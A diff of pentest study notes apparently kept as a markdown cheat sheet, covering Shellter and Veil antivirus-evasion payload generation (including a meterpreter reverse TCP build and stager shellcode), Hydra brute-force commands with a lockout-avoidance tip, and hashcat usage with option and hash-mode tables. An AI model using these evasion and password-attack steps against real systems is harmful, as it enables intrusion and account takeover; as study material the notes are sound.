@@ -2094,7 +2094,6 @@ Shellcode injection tool capable of bypassing AntiVirus apps.
 ** Requires **wine32**  
 ** Compatible ONLY w/ [x86 architecture](x86%20Architecture.md)  
   
-  
 Performs a thorough analysis of the target PE file and the execution paths.  
 It then determines where it can inject our shellcode, without relying on traditional injection techniques that are easily caught by AV engines.  
 Including changing of PE file section permissions, creating new sections, and so on.  
@@ -2102,8 +2101,7 @@ Finally, Shellter attempts to use the existing [PE Import Address Table](Portabl
   
 Shellter obfuscates both the payload as well as the payload decoder before injecting them into the PE  
   
-  
-**Operation:**  
+#### Operation  
 Mode - Auto & Manual.  
 Manual allows us to adjust options with much more granularity  
 PE Target - Requires full path to binary  
@@ -2112,10 +2110,8 @@ Stealth Mode - Attempts to restore the execution flow after the payload is execu
 Custom payloads need to terminate by exiting the current thread.  
 Payload Options - Choice of listed or custom payload  
 For Listed, need to select ‘L’, then payload index.  
-  
-  
 
-### Tips & Tricks
+#### Tips & Tricks
 
 • **Find a few 32-bit standalone legitimate executables** that always work for you and stick with them for as long as they do the job.  
 However, take in serious consideration what is discussed in this [article](https://www.shellterproject.com/an-important-tip-for-shellter-usage/), thus avoid using executables of popular applications when not needed.  
@@ -2151,3 +2147,1027 @@ If you think that reaching the amount of instructions that you chose it takes to
 However, this is a complicated task and for that reason there is always a small possibility for failure.  
 Following the list of tips and tricks presented here, will give you a good starting point for using Shellter.  
 Keep in mind that while Shellter will try to handle everything for you, it does need your common sense to give you its best.**
+
+### Veil
+
+Tool designed to generate metasploit payloads that bypass common anti-virus solutions.  
+
+#### Install
+```bash
+apt -y install veil  
+/usr/share/veil/config/setup.sh --force --silent
+```
+
+#### Main Menu
+```bash
+$ ./Veil.py  
+===============================================================================  
+                             Veil | [Version]: 3.1.6  
+===============================================================================  
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework  
+===============================================================================  
+  
+Main Menu  
+  
+  2 tools loaded  
+  
+Available Tools:  
+  
+  1)  Evasion  
+  2)  Ordnance  
+  
+Available Commands:  
+  
+  exit      Completely exit Veil  
+  info      Information on a specific tool  
+  list      List available tools  
+  options     Show Veil configuration  
+  update      Update Veil  
+  use     Use a specific tool  
+  
+Veil>:
+```
+
+#### Usage
+```bash
+$ ./Veil.py --help  
+usage: Veil.py [--list-tools] [-t TOOL] [--update] [--setup] [--config]  
+               [--version] [--ip IP] [--port PORT] [--list-payloads]  
+               [-p [PAYLOAD]] [-o OUTPUT-NAME]  
+               [-c [OPTION=value [OPTION=value ...]]]  
+               [--msfoptions [OPTION=value [OPTION=value ...]]] [--msfvenom ]  
+               [--compiler pyinstaller] [--clean] [--ordnance-payload PAYLOAD]  
+               [--list-encoders] [-e ENCODER] [-b \x00\x0a..] [--print-stats]  
+  
+Veil is a framework containing multiple tools.  
+  
+[*] Veil Options:  
+  --list-tools          List Veil''s tools  
+  -t TOOL, --tool TOOL  Specify Veil tool to use (Evasion, Ordnance etc.)  
+  --update              Update the Veil framework  
+  --setup               Run the Veil framework setup file & regenerate the  
+                        configuration  
+  --config              Regenerate the Veil framework configuration file  
+  --version             Displays version and quits  
+  
+[*] Callback Settings:  
+  --ip IP, --domain IP  IP address to connect back to  
+  --port PORT           Port number to connect to  
+  
+[*] Payload Settings:  
+  --list-payloads       Lists all available payloads for that tool  
+  
+[*] Veil-Evasion Options:  
+  -p [PAYLOAD]          Payload to generate  
+  -o OUTPUT-NAME        Output file base name for source and compiled binaries  
+  -c [OPTION=value [OPTION=value ...]]  
+                        Custom payload module options  
+  --msfoptions [OPTION=value [OPTION=value ...]]  
+                        Options for the specified metasploit payload  
+  --msfvenom []         Metasploit shellcode to generate (e.g.  
+                        windows/meterpreter/reverse_tcp etc.)  
+  --compiler pyinstaller  
+                        Compiler option for payload (currently only needed for  
+                        Python)  
+  --clean               Clean out payload folders  
+  
+[*] Veil-Ordnance Shellcode Options:  
+  --ordnance-payload PAYLOAD  
+                        Payload type (bind_tcp, rev_tcp, etc.)  
+  
+[*] Veil-Ordnance Encoder Options:  
+  --list-encoders       Lists all available encoders  
+  -e ENCODER, --encoder ENCODER  
+                        Name of shellcode encoder to use  
+  -b \x00\x0a.., --bad-chars \x00\x0a..  
+                        Bad characters to avoid  
+  --print-stats         Print information about the encoded shellcode
+```
+
+#### Veil Evasion CLI
+```bash
+$ ./Veil.py -t Evasion -p go/meterpreter/rev_tcp.py --ip 127.0.0.1 --port 4444  
+===============================================================================  
+                                   Veil-Evasion  
+===============================================================================  
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework  
+===============================================================================  
+  
+runtime/internal/sys  
+runtime/internal/atomic  
+runtime  
+errors  
+internal/race  
+sync/atomic  
+math  
+sync  
+io  
+unicode/utf8  
+internal/syscall/windows/sysdll  
+unicode/utf16  
+syscall  
+strconv  
+reflect  
+encoding/binary  
+command-line-arguments  
+===============================================================================  
+                                   Veil-Evasion  
+===============================================================================  
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework  
+===============================================================================  
+  
+ [*] Language: go  
+ [*] Payload Module: go/meterpreter/rev_tcp  
+ [*] Executable written to: /var/lib/veil/output/compiled/payload.exe  
+ [*] Source code written to: /var/lib/veil/output/source/payload.go  
+ [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc  
+$  
+$ file /var/lib/veil/output/compiled/payload.exe  
+/var/lib/veil/output/compiled/payload.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
+```
+
+#### Veil Ordnance CLI
+```bash
+$ ./Veil.py -t Ordnance --ordnance-payload rev_tcp --ip 127.0.0.1 --port 4444  
+===============================================================================  
+                                   Veil-Ordnance  
+===============================================================================  
+      [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework  
+===============================================================================  
+  
+ [*] Payload Name: Reverse TCP Stager (Stage 1)  
+ [*] IP Address: 127.0.0.1  
+ [*] Port: 4444  
+ [*] Shellcode Size: 287  
+  
+\xfc\xe8\x86\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\....
+```
+
+
+# PW Attacks
+
+## Hydra
+Network Service attack tool  
+  
+Usage Ex:  
+```bash
+# http
+hydra 192.168.180.10 http-form-post "/form /frontpage.php:user=admin&pass=^PASS^:INVALID LOGIN" -l admin -P /usr/share/wordlists/rockyou.txt -vV -f
+
+# http-get
+# add -t 1 to attempt to bypass account lockout
+hydra -I -l user -P /usr/share/wordlists/rockyou.txt -t 1 "http-get://192.168.227.201:80/:A=BASIC:F=401"
+
+# ftp
+hydra ftp://192.168.241.202 -l <user> -P /usr/share/wordlists/rockyou.txt
+
+# ssh
+hydra ssh://192.168.241.202 -l <user> -P /usr/share/wordlists/rockyou.txt
+```
+
+| Options             | Desc                                                               |
+| ------------------- | ------------------------------------------------------------------ |
+| -R                  | restore a previous aborted/crashed session                         |
+| -I                  | ignore an existing restore file (don't wait 10 seconds)            |
+| -S                  | perform an SSL connect                                             |
+| -s PORT             | if the service is on a different default port, define it here      |
+| -l LOGIN or -L FILE | login with LOGIN name, or load several logins from FILE            |
+| -p PASS  or -P FILE | try password PASS, or load several passwords from FILE             |
+| -x MIN:MAX:CHARSET  | password bruteforce generation, type "-x -h" to get help           |
+| -y                  | disable use of symbols in bruteforce, see above                    |
+| -r                  | use a non-random shuffling method for option -x                    |
+| -e nsr              | try "n" null password, "s" login as pass and/or "r" reversed login |
+| -u                  | loop around users, not passwords (effective! implied with -x)      |
+| -C FILE             | colon separated "login:pass" format, instead of -L/-P options      |
+| -M FILE             | list of servers to attack, one entry per line, ':' to specify port |
+| -o FILE             | write found login/password pairs to FILE instead of stdout         |
+| -b FORMAT           | specify the format for the -o FILE: text(default), json, jsonv1    |
+| -f / -F             | exit when a login/pass pair is found (-M: -f per host, -F global)  |
+| -t TASKS            | run TASKS number of connects in parallel per target (default: 16)  |
+| -T TASKS            | run TASKS connects in parallel overall (for -M, default: 64)       |
+| -w / -W TIME        | wait time for a response (32) / between connects per thread (0)    |
+| -c TIME             | wait time per login attempt over all threads (enforces -t 1)       |
+| -4 / -6             | use IPv4 (default) / IPv6 addresses (put always in [] also in -M)  |
+| -v / -V / -d        | verbose mode / show login+pass for each attempt / debug mode       |
+| -O                  | use old SSL v2 and v3                                              |
+| -K                  | do not redo failed attempts (good for -M mass scanning)            |
+| -q                  | do not print messages about connection errors                      |
+| -U                  | service module usage details                                       |
+| -m OPT              | options specific for a module, see -U output for information       |
+| -h                  | more command line options (COMPLETE HELP)                          |
+| server              | the target: DNS, IP or 192.168.0.0/24 (this OR the -M option)      |
+| service             | the service to crack (see below for supported protocols)           |
+| OPT                 | some service modules support additional input (-U for module help) |
+
+#### Supported services
+
+adam6500, asterisk, cisco, cisco-enable, cobaltstrike, cvs, firebird, ftp\[s], http\[s]-{head|get|post}, http\[s]-{get|post}-form, http-proxy, http-proxy-urlenum,  
+icq, imap\[s], irc, ldap2\[s], ldap3\[-{cram|digest}, md5]\[s], memcached, mongodb, mssql, mysql, nntp, oracle-listener, oracle-sid, pcanywhere, pcnfs, pop3\[s],  
+postgres, radmin2, rdp, redis, rexec, rlogin, rpcap, rsh, rtsp, s7-300, sip, smb, smtp\[s], smtp-enum, snmp, socks5, ssh, sshkey, svn, teamspeak, telnet\[s], vmauthd, vnc, xmpp
+
+#### To view info about a service's required args
+```bash
+hydra <service> -U
+```
+
+
+## Hashcat
+https://hashcat.net
+
+PW cracking tool.  
+  
+**Uses GPU for cracking rather than CPU (john)  
+
+Combinator:
+```bash
+cewl www.megacorpone.com -m 12 -w cewl-megacorp.txt  
+crunch 3 3 %%% > numbers.txt  
+hashcat –m 1400 –a 1 flag.hash cewl-megacorp.txt numbers.txt
+```
+
+Usage:
+```bash
+hashcat [options]... hash|hashfile|hccapxfile [dictionary|mask|directory]...
+```
+
+### Options
+
+|                               | Options Short / Long | Type                                                 | Description                          | Example |
+| ----------------------------- | -------------------- | ---------------------------------------------------- | ------------------------------------ | ------- |
+| -m, --hash-type               | Num                  | Hash-type, see references below                      | -m 1000                              |         |
+| -a, --attack-mode             | Num                  | Attack-mode, see references below                    | -a 3                                 |         |
+| -V, --version                 |                      | Print version                                        |                                      |         |
+| -h, --help                    |                      | Print help                                           |                                      |         |
+| --quiet                       |                      | Suppress output                                      |                                      |         |
+| --hex-charset                 |                      | Assume charset is given in hex                       |                                      |         |
+| --hex-salt                    |                      | Assume salt is given in hex                          |                                      |         |
+| --hex-wordlist                |                      | Assume words in wordlist are given in hex            |                                      |         |
+| --force                       |                      | Ignore warnings                                      |                                      |         |
+| --status                      |                      | Enable automatic update of the status screen         |                                      |         |
+| --status-json                 |                      | Enable JSON format for status output                 |                                      |         |
+| --status-timer                | Num                  | Sets seconds between status screen updates to X      | --status-timer=1                     |         |
+| --stdin-timeout-abort         | Num                  | Abort if there is no input from stdin for X seconds  | --stdin-timeout-abort=300            |         |
+| --machine-readable            |                      | Display the status view in a machine-readable format |                                      |         |
+| --keep-guessing               |                      | Keep guessing the hash after it has been cracked     |                                      |         |
+| --self-test-disable           |                      | Disable self-test functionality on startup           |                                      |         |
+| --loopback                    |                      | Add new plains to induct directory                   |                                      |         |
+| --markov-hcstat2              | File                 | Specify hcstat2 file to use                          | --markov-hcstat2=my.hcstat2          |         |
+| --markov-disable              |                      | Disables markov-chains, emulates classic brute-force |                                      |         |
+| --markov-classic              |                      | Enables classic markov-chains, no per-position       |                                      |         |
+| -t, --markov-threshold        | Num                  | Threshold X when to stop accepting new markov-chains | -t 50                                |         |
+| --runtime                     | Num                  | Abort session after X seconds of runtime             | --runtime=10                         |         |
+| --session                     | Str                  | Define specific session name                         | --session=mysession                  |         |
+| --restore                     |                      | Restore session from --session                       |                                      |         |
+| --restore-disable             |                      | Do not write restore file                            |                                      |         |
+| --restore-file-path           | File                 | Specific path to restore file                        | --restore-file-path=x.restore        |         |
+| -o, --outfile                 | File                 | Define outfile for recovered hash                    | -o outfile.txt                       |         |
+| --outfile-format              | Str                  | Outfile format to use, separated with commas         | --outfile-format=1,3                 |         |
+| --outfile-autohex-disable     |                      | Disable the use of $HEX[] in output plains           |                                      |         |
+| --outfile-check-timer         | Num                  | Sets seconds between outfile checks to X             | --outfile-check=30                   |         |
+| --wordlist-autohex-disable    |                      | Disable the conversion of $HEX[] from the wordlist   |                                      |         |
+| -p, --separator               | Char                 | Separator char for hashlists and outfile             | -p :                                 |         |
+| --stdout                      |                      | Do not crack a hash, instead print candidates only   |                                      |         |
+| --show                        |                      | Compare hashlist with potfile; show cracked hashes   |                                      |         |
+| --left                        |                      | Compare hashlist with potfile; show uncracked hashes |                                      |         |
+| --username                    |                      | Enable ignoring of usernames in hashfile             |                                      |         |
+| --remove                      |                      | Enable removal of hashes once they are cracked       |                                      |         |
+| --remove-timer                | Num                  | Update input hash file each X seconds                | --remove-timer=30                    |         |
+| --potfile-disable             |                      | Do not write potfile                                 |                                      |         |
+| --potfile-path                | File                 | Specific path to potfile                             | --potfile-path=my.pot                |         |
+| --encoding-from               | Code                 | Force internal wordlist encoding from X              | --encoding-from=iso-8859-15          |         |
+| --encoding-to                 | Code                 | Force internal wordlist encoding to X                | --encoding-to=utf-32le               |         |
+| --debug-mode                  | Num                  | Defines the debug mode (hybrid only by using rules)  | --debug-mode=4                       |         |
+| --debug-file                  | File                 | Output file for debugging rules                      | --debug-file=good.log                |         |
+| --induction-dir               | Dir                  | Specify the induction directory to use for loopback  | --induction=inducts                  |         |
+| --outfile-check-dir           | Dir                  | Specify the outfile directory to monitor for plains  | --outfile-check-dir=x                |         |
+| --logfile-disable             |                      | Disable the logfile                                  |                                      |         |
+| --hccapx-message-pair         | Num                  | Load only message pairs from hccapx matching X       | --hccapx-message-pair=2              |         |
+| --nonce-error-corrections     | Num                  | The BF size range to replace AP's nonce last bytes   | --nonce-error-corrections=16         |         |
+| --keyboard-layout-mapping     | File                 | Keyboard layout mapping table for special hash-modes | --keyb=german.hckmap                 |         |
+| --truecrypt-keyfiles          | File                 | Keyfiles to use, separated with commas               | --truecrypt-keyf=x.png               |         |
+| --veracrypt-keyfiles          | File                 | Keyfiles to use, separated with commas               | --veracrypt-keyf=x.txt               |         |
+| --veracrypt-pim-start         | Num                  | VeraCrypt personal iterations multiplier start       | --veracrypt-pim-start=450            |         |
+| --veracrypt-pim-stop          | Num                  | VeraCrypt personal iterations multiplier stop        | --veracrypt-pim-stop=500             |         |
+| -b, --benchmark               |                      | Run benchmark of selected hash-modes                 |                                      |         |
+| --benchmark-all               |                      | Run benchmark of all hash-modes (requires -b)        |                                      |         |
+| --speed-only                  |                      | Return expected speed of the attack, then quit       |                                      |         |
+| --progress-only               |                      | Return ideal progress step size and time to process  |                                      |         |
+| -c, --segment-size            | Num                  | Sets size in MB to cache from the wordfile to X      | -c 32                                |         |
+| --bitmap-min                  | Num                  | Sets minimum bits allowed for bitmaps to X           | --bitmap-min=24                      |         |
+| --bitmap-max                  | Num                  | Sets maximum bits allowed for bitmaps to X           | --bitmap-max=24                      |         |
+| --cpu-affinity                | Str                  | Locks to CPU devices, separated with commas          | --cpu-affinity=1,2,3                 |         |
+| --hook-threads                | Num                  | Sets number of threads for a hook (per compute unit) | --hook-threads=8                     |         |
+| --example-hashes              |                      | Show an example hash for each hash-mode              |                                      |         |
+| --backend-ignore-cuda         |                      | Do not try to open CUDA interface on startup         |                                      |         |
+| --backend-ignore-opencl       |                      | Do not try to open OpenCL interface on startup       |                                      |         |
+| -I, --backend-info            |                      | Show info about detected backend API devices         | -I                                   |         |
+| -d, --backend-devices         | Str                  | Backend devices to use, separated with commas        | -d 1                                 |         |
+| -D, --opencl-device-types     | Str                  | OpenCL device-types to use, separated with commas    | -D 1                                 |         |
+| -O, --optimized-kernel-enable |                      | Enable optimized kernels (limits password length)    |                                      |         |
+| -w, --workload-profile        | Num                  | Enable a specific workload profile, see pool below   | -w 3                                 |         |
+| -n, --kernel-accel            | Num                  | Manual workload tuning, set outerloop step size to X | -n 64                                |         |
+| -u, --kernel-loops            | Num                  | Manual workload tuning, set innerloop step size to X | -u 256                               |         |
+| -T, --kernel-threads          | Num                  | Manual workload tuning, set thread count to X        | -T 64                                |         |
+| --backend-vector-width        | Num                  | Manually override backend vector-width to X          | --backend-vector=4                   |         |
+| --spin-damp                   | Num                  | Use CPU for device synchronization, in percent       | --spin-damp=10                       |         |
+| --hwmon-disable               |                      | Disable temperature and fanspeed reads and triggers  |                                      |         |
+| --hwmon-temp-abort            | Num                  | Abort if temperature reaches X degrees Celsius       | --hwmon-temp-abort=100               |         |
+| --scrypt-tmto                 | Num                  | Manually override TMTO value for scrypt to X         | --scrypt-tmto=3                      |         |
+| -s, --skip                    | Num                  | Skip X words from the start                          | -s 1000000                           |         |
+| -l, --limit                   | Num                  | Limit X words from the start + skipped words         | -l 1000000                           |         |
+| --keyspace                    |                      | Show keyspace base:mod values and quit               |                                      |         |
+| -j, --rule-left               | Rule                 | Single rule applied to each word from left wordlist  | -j 'c'                               |         |
+| -k, --rule-right              | Rule                 | Single rule applied to each word from right wordlist | -k '^-'                              |         |
+| -r, --rules-file              | File                 | Multiple rules applied to each word from wordlists   | -r rules/best64.rule                 |         |
+| -g, --generate-rules          | Num                  | Generate X random rules                              | -g 10000                             |         |
+| --generate-rules-func-min     | Num                  | Force min X functions per rule                       |                                      |         |
+| --generate-rules-func-max     | Num                  | Force max X functions per rule                       |                                      |         |
+| --generate-rules-seed         | Num                  | Force RNG seed set to X                              |                                      |         |
+| -1, --custom-charset1         | CS                   | User-defined charset ?1                              | -1 ?l?d?u                            |         |
+| -2, --custom-charset2         | CS                   | User-defined charset ?2                              | -2 ?l?d?s                            |         |
+| -3, --custom-charset3         | CS                   | User-defined charset ?3                              |                                      |         |
+| -4, --custom-charset4         | CS                   | User-defined charset ?4                              |                                      |         |
+| -i, --increment               |                      | Enable mask increment mode                           |                                      |         |
+| --increment-min               | Num                  | Start mask incrementing at X                         | --increment-min=4                    |         |
+| --increment-max               | Num                  | Stop mask incrementing at X                          | --increment-max=8                    |         |
+| -S, --slow-candidates         |                      | Enable slower (but advanced) candidate generators    |                                      |         |
+| --brain-server                |                      | Enable brain server                                  |                                      |         |
+| --brain-server-timer          | Num                  | Update the brain server dump each X seconds (min:60) | --brain-server-timer=300             |         |
+| -z, --brain-client            |                      | Enable brain client, activates -S                    |                                      |         |
+| --brain-client-features       | Num                  | Define brain client features, see below              | --brain-client-features=3            |         |
+| --brain-host                  | Str                  | Brain server host (IP or domain)                     | --brain-host=127.0.0.1               |         |
+| --brain-port                  | Port                 | Brain server port                                    | --brain-port=13743                   |         |
+| --brain-password              | Str                  | Brain server authentication password                 | --brain-password=bZfhCvGUSjRq        |         |
+| --brain-session               | Hex                  | Overrides automatically calculated brain session     | --brain-session=0x2ae611db           |         |
+| --brain-session-whitelist     | Hex                  | Allow given sessions only, separated with commas     | --brain-session-whitelist=0x2ae611db |         |
+
+
+### Hash modes
+
+| Name  | Category                                         |                                       |
+| ----- | ------------------------------------------------ | ------------------------------------- |
+| 900   | MD4                                              | Raw Hash                              |
+| 0     | MD5                                              | Raw Hash                              |
+| 100   | SHA1                                             | Raw Hash                              |
+| 1300  | SHA2-224                                         | Raw Hash                              |
+| 1400  | SHA2-256                                         | Raw Hash                              |
+| 10800 | SHA2-384                                         | Raw Hash                              |
+| 1700  | SHA2-512                                         | Raw Hash                              |
+| 17300 | SHA3-224                                         | Raw Hash                              |
+| 17400 | SHA3-256                                         | Raw Hash                              |
+| 17500 | SHA3-384                                         | Raw Hash                              |
+| 17600 | SHA3-512                                         | Raw Hash                              |
+| 6000  | RIPEMD-160                                       | Raw Hash                              |
+| 600   | BLAKE2b-512                                      | Raw Hash                              |
+| 11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian | Raw Hash                              |
+| 11800 | GOST R 34.11-2012 (Streebog) 512-bit, big-endian | Raw Hash                              |
+| 6900  | GOST R 34.11-94                                  | Raw Hash                              |
+| 5100  | Half MD5                                         | Raw Hash                              |
+| 18700 | Java Object hashCode()                           | Raw Hash                              |
+| 17700 | Keccak-224                                       | Raw Hash                              |
+| 17800 | Keccak-256                                       | Raw Hash                              |
+| 17900 | Keccak-384                                       | Raw Hash                              |
+| 18000 | Keccak-512                                       | Raw Hash                              |
+| 21400 | sha256(sha256_bin($pass))                        | Raw Hash                              |
+| 6100  | Whirlpool                                        | Raw Hash                              |
+| 10100 | SipHash                                          | Raw Hash                              |
+| 21000 | BitShares v0.x - sha512(sha512_bin(pass))        | Raw Hash                              |
+| 10    | md5($pass.$salt)                                 | Raw Hash, Salted and/or Iterated      |
+| 20    | md5($salt.$pass)                                 | Raw Hash, Salted and/or Iterated      |
+| 3800  | md5($salt.$pass.$salt)                           | Raw Hash, Salted and/or Iterated      |
+| 3710  | md5($salt.md5($pass))                            | Raw Hash, Salted and/or Iterated      |
+| 4110  | md5($salt.md5($pass.$salt))                      | Raw Hash, Salted and/or Iterated      |
+| 4010  | md5($salt.md5($salt.$pass))                      | Raw Hash, Salted and/or Iterated      |
+| 21300 | md5($salt.sha1($salt.$pass))                     | Raw Hash, Salted and/or Iterated      |
+| 40    | md5($salt.utf16le($pass))                        | Raw Hash, Salted and/or Iterated      |
+| 2600  | md5(md5($pass))                                  | Raw Hash, Salted and/or Iterated      |
+| 3910  | md5(md5($pass).md5($salt))                       | Raw Hash, Salted and/or Iterated      |
+| 4400  | md5(sha1($pass))                                 | Raw Hash, Salted and/or Iterated      |
+| 20900 | md5(sha1($pass).md5($pass).sha1($pass))          | Raw Hash, Salted and/or Iterated      |
+| 21200 | md5(sha1($salt).md5($pass))                      | Raw Hash, Salted and/or Iterated      |
+| 4300  | md5(strtoupper(md5($pass)))                      | Raw Hash, Salted and/or Iterated      |
+| 30    | md5(utf16le($pass).$salt)                        | Raw Hash, Salted and/or Iterated      |
+| 110   | sha1($pass.$salt)                                | Raw Hash, Salted and/or Iterated      |
+| 120   | sha1($salt.$pass)                                | Raw Hash, Salted and/or Iterated      |
+| 4900  | sha1($salt.$pass.$salt)                          | Raw Hash, Salted and/or Iterated      |
+| 4520  | sha1($salt.sha1($pass))                          | Raw Hash, Salted and/or Iterated      |
+| 140   | sha1($salt.utf16le($pass))                       | Raw Hash, Salted and/or Iterated      |
+| 19300 | sha1($salt1.$pass.$salt2)                        | Raw Hash, Salted and/or Iterated      |
+| 14400 | sha1(CX)                                         | Raw Hash, Salted and/or Iterated      |
+| 4700  | sha1(md5($pass))                                 | Raw Hash, Salted and/or Iterated      |
+| 4710  | sha1(md5($pass).$salt)                           | Raw Hash, Salted and/or Iterated      |
+| 21100 | sha1(md5($pass.$salt))                           | Raw Hash, Salted and/or Iterated      |
+| 18500 | sha1(md5(md5($pass)))                            | Raw Hash, Salted and/or Iterated      |
+| 4500  | sha1(sha1($pass))                                | Raw Hash, Salted and/or Iterated      |
+| 130   | sha1(utf16le($pass).$salt)                       | Raw Hash, Salted and/or Iterated      |
+| 1410  | sha256($pass.$salt)                              | Raw Hash, Salted and/or Iterated      |
+| 1420  | sha256($salt.$pass)                              | Raw Hash, Salted and/or Iterated      |
+| 22300 | sha256($salt.$pass.$salt)                        | Raw Hash, Salted and/or Iterated      |
+| 1440  | sha256($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated      |
+| 20800 | sha256(md5($pass))                               | Raw Hash, Salted and/or Iterated      |
+| 20710 | sha256(sha256($pass).$salt)                      | Raw Hash, Salted and/or Iterated      |
+| 1430  | sha256(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated      |
+| 1710  | sha512($pass.$salt)                              | Raw Hash, Salted and/or Iterated      |
+| 1720  | sha512($salt.$pass)                              | Raw Hash, Salted and/or Iterated      |
+| 1740  | sha512($salt.utf16le($pass))                     | Raw Hash, Salted and/or Iterated      |
+| 1730  | sha512(utf16le($pass).$salt)                     | Raw Hash, Salted and/or Iterated      |
+| 19500 | Ruby on Rails Restful-Authentication             | Raw Hash, Salted and/or Iterated      |
+| 50    | HMAC-MD5 (key = $pass)                           | Raw Hash, Authenticated               |
+| 60    | HMAC-MD5 (key = $salt)                           | Raw Hash, Authenticated               |
+| 150   | HMAC-SHA1 (key = $pass)                          | Raw Hash, Authenticated               |
+| 160   | HMAC-SHA1 (key = $salt)                          | Raw Hash, Authenticated               |
+| 1450  | HMAC-SHA256 (key = $pass)                        | Raw Hash, Authenticated               |
+| 1460  | HMAC-SHA256 (key = $salt)                        | Raw Hash, Authenticated               |
+| 1750  | HMAC-SHA512 (key = $pass)                        | Raw Hash, Authenticated               |
+| 1760  | HMAC-SHA512 (key = $salt)                        | Raw Hash, Authenticated               |
+| 11750 | HMAC-Streebog-256 (key = $pass), big-endian      | Raw Hash, Authenticated               |
+| 11760 | HMAC-Streebog-256 (key = $salt), big-endian      | Raw Hash, Authenticated               |
+| 11850 | HMAC-Streebog-512 (key = $pass), big-endian      | Raw Hash, Authenticated               |
+| 11860 | HMAC-Streebog-512 (key = $salt), big-endian      | Raw Hash, Authenticated               |
+| 11500 | CRC32                                            | Raw Checksum                          |
+| 14100 | 3DES (PT = $salt, key = $pass)                   | Raw Cipher, Known-Plaintext attack    |
+| 14000 | DES (PT = $salt, key = $pass)                    | Raw Cipher, Known-Plaintext attack    |
+| 15400 | ChaCha20                                         | Raw Cipher, Known-Plaintext attack    |
+| 14900 | Skip32 (PT = $salt, key = $pass)                 | Raw Cipher, Known-Plaintext attack    |
+| 11900 | PBKDF2-HMAC-MD5                                  | Generic KDF                           |
+| 12000 | PBKDF2-HMAC-SHA1                                 | Generic KDF                           |
+| 10900 | PBKDF2-HMAC-SHA256                               | Generic KDF                           |
+| 12100 | PBKDF2-HMAC-SHA512                               | Generic KDF                           |
+| 8900  | scrypt                                           | Generic KDF                           |
+| 400   | phpass                                           | Generic KDF                           |
+| 16900 | Ansible Vault                                    | Generic KDF                           |
+| 12001 | Atlassian (PBKDF2-HMAC-SHA1)                     | Generic KDF                           |
+| 20200 | Python passlib pbkdf2-sha512                     | Generic KDF                           |
+| 20300 | Python passlib pbkdf2-sha256                     | Generic KDF                           |
+| 20400 | Python passlib pbkdf2-sha1                       | Generic KDF                           |
+| 16100 | TACACS+                                          | Network Protocols                     |
+| 11400 | SIP digest authentication (MD5)                  | Network Protocols                     |
+| 5300  | IKE-PSK MD5                                      | Network Protocols                     |
+| 5400  | IKE-PSK SHA1                                     | Network Protocols                     |
+| 23200 | XMPP SCRAM PBKDF2-SHA1                           | Network Protocols                     |
+| 2500  | WPA-EAPOL-PBKDF2                                 | Network Protocols                     |
+| 2501  | WPA-EAPOL-PMK                                    | Network Protocols                     |
+| 22000 | WPA-PBKDF2-PMKID+EAPOL                           | Network Protocols                     |
+| 22001 | WPA-PMK-PMKID+EAPOL                              | Network Protocols                     |
+| 16800 | WPA-PMKID-PBKDF2                                 | Network Protocols                     |
+| 16801 | WPA-PMKID-PMK                                    | Network Protocols                     |
+| 7300  | IPMI2 RAKP HMAC-SHA1                             | Network Protocols                     |
+| 10200 | CRAM-MD5                                         | Network Protocols                     |
+| 4800  | iSCSI CHAP authentication, MD5(CHAP)             | Network Protocols                     |
+| 16500 | JWT (JSON Web Token)                             | Network Protocols                     |
+| 22600 | Telegram Desktop App Passcode (PBKDF2-HMAC-SHA1) | Network Protocols                     |
+| 22301 | Telegram Mobile App Passcode (SHA256)            | Network Protocols                     |
+| 7500  | Kerberos 5, etype 23, AS-REQ Pre-Auth            | Network Protocols                     |
+| 13100 | Kerberos 5, etype 23, TGS-REP                    | Network Protocols                     |
+| 18200 | Kerberos 5, etype 23, AS-REP                     | Network Protocols                     |
+| 19600 | Kerberos 5, etype 17, TGS-REP                    | Network Protocols                     |
+| 19700 | Kerberos 5, etype 18, TGS-REP                    | Network Protocols                     |
+| 19800 | Kerberos 5, etype 17, Pre-Auth                   | Network Protocols                     |
+| 19900 | Kerberos 5, etype 18, Pre-Auth                   | Network Protocols                     |
+| 5500  | NetNTLMv1 / NetNTLMv1+ESS                        | Network Protocols                     |
+| 5600  | NetNTLMv2                                        | Network Protocols                     |
+| 23    | Skype                                            | Network Protocols                     |
+| 11100 | PostgreSQL CRAM (MD5)                            | Network Protocols                     |
+| 11200 | MySQL CRAM (SHA1)                                | Network Protocols                     |
+| 8500  | RACF                                             | Operating System                      |
+| 6300  | AIX {smd5}                                       | Operating System                      |
+| 6700  | AIX {ssha1}                                      | Operating System                      |
+| 6400  | AIX {ssha256}                                    | Operating System                      |
+| 6500  | AIX {ssha512}                                    | Operating System                      |
+| 3000  | LM                                               | Operating System                      |
+| 19000 | QNX /etc/shadow (MD5)                            | Operating System                      |
+| 19100 | QNX /etc/shadow (SHA256)                         | Operating System                      |
+| 19200 | QNX /etc/shadow (SHA512)                         | Operating System                      |
+| 15300 | DPAPI masterkey file v1                          | Operating System                      |
+| 15900 | DPAPI masterkey file v2                          | Operating System                      |
+| 7200  | GRUB 2                                           | Operating System                      |
+| 12800 | MS-AzureSync PBKDF2-HMAC-SHA256                  | Operating System                      |
+| 12400 | BSDi Crypt, Extended DES                         | Operating System                      |
+| 1000  | NTLM                                             | Operating System                      |
+| 122   | macOS v10.4, macOS v10.5, MacOS v10.6            | Operating System                      |
+| 1722  | macOS v10.7                                      | Operating System                      |
+| 7100  | macOS v10.8+ (PBKDF2-SHA512)                     | Operating System                      |
+| 9900  | Radmin2                                          | Operating System                      |
+| 5800  | Samsung Android Password/PIN                     | Operating System                      |
+| 3200  | bcrypt $2*$, Blowfish (Unix)                     | Operating System                      |
+| 500   | md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)        | Operating System                      |
+| 1500  | descrypt, DES (Unix), Traditional DES            | Operating System                      |
+| 7400  | sha256crypt $5$, SHA256 (Unix)                   | Operating System                      |
